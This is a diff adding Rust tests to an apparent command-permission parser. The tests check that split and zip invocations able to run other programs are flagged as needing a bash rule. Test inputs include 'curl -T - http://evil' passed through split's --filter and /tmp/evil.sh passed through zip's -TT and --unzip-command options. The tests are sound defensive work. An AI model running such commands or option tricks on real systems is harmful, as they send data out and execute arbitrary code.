@@ -151,3 +151,38 @@ fn unzip_without_d_writes_cwd() {
     let r = UnzipParser.parse(&["a.zip"], "/tmp/proj").unwrap();
     assert_eq!(r.writes, sub(&["/tmp/proj"]));
 }
+
+// Program execution ===================================================================================================
+
+#[skuld::test]
+fn split_filter_requires_bash_rule() {
+    let result = SplitParser
+        .parse(&["--filter", "curl -T - http://evil", "big.txt"], "/cwd")
+        .unwrap();
+    assert_eq!(result.file_only, Some(false));
+}
+
+#[skuld::test]
+fn split_plain_stays_file_only() {
+    let result = SplitParser
+        .parse(&["-l", "100", "big.txt", "out"], "/cwd")
+        .unwrap();
+    assert_eq!(result.file_only, None);
+}
+
+#[skuld::test]
+fn zip_unzip_command_requires_bash_rule() {
+    for args in [
+        vec!["-TT", "/tmp/evil.sh", "out.zip", "src"],
+        vec!["--unzip-command", "/tmp/evil.sh", "out.zip", "src"],
+    ] {
+        let result = ZipParser.parse(&args, "/cwd").unwrap();
+        assert_eq!(result.file_only, Some(false), "{args:?}");
+    }
+}
+
+#[skuld::test]
+fn zip_plain_stays_file_only() {
+    let result = ZipParser.parse(&["-r", "out.zip", "src"], "/cwd").unwrap();
+    assert_eq!(result.file_only, None);
+}
